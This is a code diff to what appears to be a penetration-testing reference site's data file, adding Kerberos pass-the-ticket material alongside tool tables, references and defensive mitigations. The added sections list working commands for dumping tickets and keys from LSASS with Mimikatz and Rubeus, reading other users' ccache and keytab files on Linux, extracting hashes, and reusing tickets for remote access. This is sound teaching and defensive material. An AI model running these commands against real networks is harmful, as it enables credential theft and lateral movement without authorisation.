@@ -5899,6 +5899,29 @@ var VULNS = [
             ]
           },
           {
+            title: "Harvesting & passing tickets (Windows)",
+            type: "commands",
+            commands: [
+              { label: "1. Harvest tickets — Mimikatz (admin dumps all users)", cmd: "# exports every ticket from LSASS to .kirbi files in the current directory:\nmimikatz.exe privilege::debug \"sekurlsa::tickets /export\" exit\n# a krbtgt/* .kirbi is that user's TGT; the rest are service tickets (TGS)" },
+              { label: "2. Harvest tickets — Rubeus dump (base64)", cmd: "# prints tickets base64-encoded instead of writing files; admin = all users\nRubeus.exe dump /nowrap" },
+              { label: "3. Overpass-the-Hash / Pass-the-Key — mint a TGT from a key", cmd: "# Mimikatz needs admin, Rubeus does not. Prefer the AES256 key over RC4:\nmimikatz.exe privilege::debug \"sekurlsa::ekeys\" exit   # list Kerberos keys\nRubeus.exe asktgt /user:plaintext /domain:<domain> /aes256:<key> /nowrap" },
+              { label: "4. Pass-the-Ticket — inject a TGT/TGS into the session", cmd: "# straight from asktgt:\nRubeus.exe asktgt /user:john /domain:<domain> /aes256:<key> /ptt\n# or import a captured ticket (a .kirbi file OR a base64 string):\nRubeus.exe ptt /ticket:<file.kirbi-or-base64>\nmimikatz.exe \"kerberos::ptt ticket.kirbi\" exit\nklist                        # confirm 'cached tickets'\ndir \\\\dc01.<domain>\\c$        # use the access" },
+              { label: "5. Sacrificial session + PowerShell Remoting", cmd: "# createnetonly makes a logon-type-9 process so you don't clobber your own TGT\n# (same idea as runas /netonly); /show reveals the spawned window:\nRubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /show\n# in that new window, request+inject a TGT, then remote in:\nRubeus.exe asktgt /user:john /domain:<domain> /aes256:<key> /ptt\npowershell -c \"Enter-PSSession -ComputerName DC01\"" }
+            ]
+          },
+          {
+            title: "Pass-the-Ticket from Linux",
+            type: "commands",
+            commands: [
+              { label: "1. Find tickets on a domain-joined Linux host", cmd: "env | grep -i krb5          # KRB5CCNAME points at the active ccache\nls -la /tmp/krb5cc_*        # other users' ccache files (root can read them)\nfind / -name '*.keytab' 2>/dev/null   # keytabs, often used by cron/scripts\nrealm list                  # confirm the box is domain-joined" },
+              { label: "2. Use a ccache file — point KRB5CCNAME at it", cmd: "cp /tmp/krb5cc_647401106_I8I133 /root/\nexport KRB5CCNAME=/root/krb5cc_647401106_I8I133\nklist                        # check the principal + valid/expires\nsmbclient //dc01/C$ -k -c ls -no-pass" },
+              { label: "3. Impersonate from a keytab (kinit)", cmd: "klist -k -t /opt/carlos.keytab        # which principal it holds\n# kinit is case-sensitive - match klist exactly (user lower, REALM upper):\nkinit carlos@INLANEFREIGHT.HTB -k -t /opt/carlos.keytab\nklist                                  # default principal is now carlos" },
+              { label: "4. Extract hashes from a keytab (crack / PtH)", cmd: "python3 keytabextract.py /opt/carlos.keytab\n# -> REALM, principal, and NTLM + AES256/AES128 hashes\n# NTLM -> pass-the-hash or crack ; AES -> Rubeus asktgt or crack" },
+              { label: "5. Drive attack tools over the ticket (-k)", cmd: "export KRB5CCNAME=/path/to.ccache\nproxychains impacket-wmiexec dc01 -k -no-pass    # -k = use Kerberos\nproxychains evil-winrm -i dc01 -r inlanefreight.htb   # needs krb5-user + krb5.conf" },
+              { label: "6. Convert ticket formats / mass-harvest", cmd: "impacket-ticketConverter krb5cc_julio.ccache julio.kirbi   # ccache -> kirbi\nimpacket-ticketConverter julio.kirbi julio.ccache          # and back\n# Linikatz (root) pulls ccache/keytabs from SSSD/Samba/FreeIPA in one sweep" }
+            ]
+          },
+          {
             title: "UAC & local accounts (why a local-admin PtH can fail)",
             type: "notes",
             items: [
@@ -5926,11 +5949,14 @@ var VULNS = [
             rows: [
               ["Impacket psexec/wmiexec/getTGT", "PtH, overpass-the-hash, pass-the-key execution"],
               ["NetExec", "Spray hashes to map admin access (--local-auth / -H)"],
-              ["Rubeus", "dump/ptt (pass-the-ticket), asktgt (overpass-the-hash)"],
-              ["Mimikatz (sekurlsa::pth)", "Windows: spawn a process with an NT hash injected into LSASS"],
+              ["Rubeus", "dump / ptt / asktgt / createnetonly — harvest, mint and inject tickets on Windows"],
+              ["Mimikatz (sekurlsa::pth / tickets / ekeys / ptt)", "Windows: inject a hash, export tickets, dump Kerberos keys, pass a ticket"],
               ["Invoke-TheHash", "Windows PowerShell PtH over SMB/WMI (Invoke-SMBExec / Invoke-WMIExec)"],
-              ["evil-winrm", "-H to pass-the-hash over WinRM (prepend domain\\ for a domain account)"],
-              ["xfreerdp /pth", "Linux: Pass-the-Hash into an RDP GUI session (needs Restricted Admin on the target)"]
+              ["evil-winrm", "-H to pass-the-hash, or -r <realm> to pass-the-ticket (Kerberos) over WinRM"],
+              ["xfreerdp /pth", "Linux: Pass-the-Hash into an RDP GUI session (needs Restricted Admin on the target)"],
+              ["kinit / klist", "Linux: load a keytab/ccache into the session and inspect tickets"],
+              ["KeyTabExtract", "Pull NTLM/AES hashes out of a Linux .keytab file"],
+              ["impacket-ticketConverter / Linikatz", "Convert .kirbi<->ccache; Linikatz mass-harvests Linux Kerberos creds (root)"]
             ]
           },
           {
@@ -5938,6 +5964,9 @@ var VULNS = [
             type: "references",
             items: [
               { label: "MITRE ATT&CK T1550.002 — Pass the Hash", url: "https://attack.mitre.org/techniques/T1550/002/" },
+              { label: "MITRE ATT&CK T1550.003 — Pass the Ticket", url: "https://attack.mitre.org/techniques/T1550/003/" },
+              { label: "Vuln — Shadow Credentials & Pass-the-Certificate (PKINIT)", url: "vuln-detail.html?vuln=shadow-credentials" },
+              { label: "GhostPack — Rubeus (harvest / asktgt / ptt / createnetonly)", url: "https://github.com/GhostPack/Rubeus" },
               { label: "Microsoft — NTLM overview", url: "https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview" },
               { label: "SpecterOps — Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy", url: "https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167" },
               { label: "Invoke-TheHash — PowerShell PtH (SMB/WMI)", url: "https://github.com/Kevin-Robertson/Invoke-TheHash" },
@@ -5954,7 +5983,8 @@ var VULNS = [
               "Leave LocalAccountTokenFilterPolicy at 0 (and consider FilterAdministratorToken = 1) so non-RID-500 local admins — ideally the RID-500 too — cannot be used for remote pass-the-hash.",
               "Keep Restricted Admin Mode disabled where it is not needed: enabling it (DisableRestrictedAdmin = 0) is exactly what makes RDP pass-the-hash possible.",
               "Block/limit NTLM where possible and prefer Kerberos; monitor for RC4 overpass-the-hash (encryption downgrade).",
-              "Detect: the same account authenticating to many hosts rapidly, and TGT requests from unusual hosts (event 4768/4624 type 3/9)."
+              "On domain-joined Linux hosts, lock down keytab and ccache files (least-privilege on /tmp/krb5cc_* and /etc/krb5.keytab) and avoid storing keytabs for privileged accounts where a web/app service can read them.",
+              "Keep ticket lifetimes short and detect: the same account authenticating to many hosts rapidly, and TGT requests from unusual hosts (event 4768/4624 type 3/9)."
             ]
           }
         ]
